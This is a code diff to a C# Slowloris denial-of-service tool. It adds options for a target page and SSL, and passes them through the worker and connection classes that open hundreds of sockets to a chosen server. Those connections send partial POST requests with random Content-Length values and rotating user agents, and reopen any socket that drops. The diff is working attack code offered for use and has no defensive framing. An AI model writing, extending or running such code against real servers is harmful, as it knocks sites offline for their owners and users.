@@ -18,8 +18,16 @@ namespace slowloris
             HelpText = "The DNS address or IP address of the target server that you wish to perform the attack on.")]
         public string Address { get; set; }
 
+        [Option('u', "url", DefaultValue = "/",
+          HelpText = "The page to attack.")]
+        public string URL { get; set; }
+
+        [Option("ssl", DefaultValue = false,
+          HelpText = "Whether or not to use SSL.")]
+        public bool SSL { get; set; }
+
         [Option('p', "port", DefaultValue = 80,
-          HelpText = "The port to attack on the target server. HTTPS is only supported on port 443 as of right now!")]
+         HelpText = "The port to attack on the target server.")]
         public int Port { get; set; }
 
         [Option('s', "sockets", DefaultValue = 200,
@@ -96,7 +104,7 @@ namespace slowloris
 
             Console.WriteLine("\r\n [*] Starting Slow Loris...");
 
-            SlowLoris(cmdargs.Address, ip, cmdargs.Port, cmdargs.Sockets, cmdargs.Timeout);
+            SlowLoris(cmdargs.Address, ip, cmdargs.URL, cmdargs.Port, cmdargs.Sockets, cmdargs.Timeout, cmdargs.SSL);
 
             Console.WriteLine(" [*] Started Slow Loris...");
 
@@ -133,20 +141,20 @@ namespace slowloris
             "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0"
         };
         #endregion
-        private static void SlowLoris(string address, string ip, int port, int sockets, int timeout)
+        private static void SlowLoris(string address, string ip, string url, int port, int sockets, int timeout, bool ssl)
         {
             // Left this way after a failed attempt at multi-threading
             // I was not seeing any performance benefits
             Thread X = new Thread(() =>
             {
-                SlowLorisWorker(address, ip, port, sockets, timeout);
+                SlowLorisWorker(address, ip, url, port, sockets, timeout, ssl);
             });
 
             X.Start();
         }
 
         #region Slow Loris Worker
-        private static void SlowLorisWorker(string address, string ip, int port, int sockets, int timeout)
+        private static void SlowLorisWorker(string address, string ip, string url, int port, int sockets, int timeout, bool ssl)
         {
             List<SlowLorisConnection> SlowLorisConnections = new List<SlowLorisConnection>();
             new Thread(() => KeepAlive(sockets, timeout, SlowLorisConnections)).Start();
@@ -157,7 +165,7 @@ namespace slowloris
                 // Add New Connection
                 try
                 {
-                    SlowLorisConnection slc = new SlowLorisConnection(address, ip, port, UserAgents[UserAgentRandomizer.Next(0, UserAgents.Count - 1)]);
+                    SlowLorisConnection slc = new SlowLorisConnection(address, ip, url, ssl, port, UserAgents[UserAgentRandomizer.Next(0, UserAgents.Count - 1)]);
                     SlowLorisConnections.Add(slc);
                     ConsectutiveFailures = 0;
                 }
@@ -202,7 +210,7 @@ namespace slowloris
                         {
                             try
                             {
-                                SlowLorisConnection slc = new SlowLorisConnection(SlowLorisConnections[x].address, SlowLorisConnections[x].ip, SlowLorisConnections[x].port, UserAgents[UserAgentRandomizer.Next(0, UserAgents.Count - 1)]);
+                                SlowLorisConnection slc = new SlowLorisConnection(SlowLorisConnections[x].address, SlowLorisConnections[x].ip, SlowLorisConnections[x].url, SlowLorisConnections[x].ssl, SlowLorisConnections[x].port, UserAgents[UserAgentRandomizer.Next(0, UserAgents.Count - 1)]);
                                 SlowLorisConnections.Add(slc);
                             }
                             catch (Exception)
@@ -242,14 +250,18 @@ namespace slowloris
     {
         public string address { get; private set; }
         public string ip { get; private set; }
+        public string url { get; private set; }
+        public bool ssl { get; private set; }
         public int port { get; private set; }
         private Random randomizer;
         private StreamWriter TCPWriter;
         private SslStream SSLWriter;
 
-        public SlowLorisConnection(string address, string ip, int port, string ua) {
+        public SlowLorisConnection(string address, string ip, string url, bool ssl, int port, string ua) {
             this.address = address;
             this.ip = ip;
+            this.url = url;
+            this.ssl = ssl;
             this.port = port;
             randomizer = new Random(DateTime.UtcNow.Millisecond);
 
@@ -263,10 +275,10 @@ namespace slowloris
                 throw new Exception("Connection Timed Out!");
             }
 
-            string Request = $" POST / HTTP/1.1\r\nContent-type: application/x-www-form-urlencoded\r\n" +
+            string Request = $"POST {url} HTTP/1.1\r\nContent-type: application/x-www-form-urlencoded\r\n" +
                 $"{string.Format("Content-Length: {0}", randomizer.Next(0, 5000))}\r\n{string.Format("User-Agent: {0}", ua)}\r\nAccept-language: en-US,en,q=0.5\r\n";
 
-            if (port == 443)
+            if (ssl)
             {
                 SSLWriter = new SslStream(TCPClient.GetStream());
 
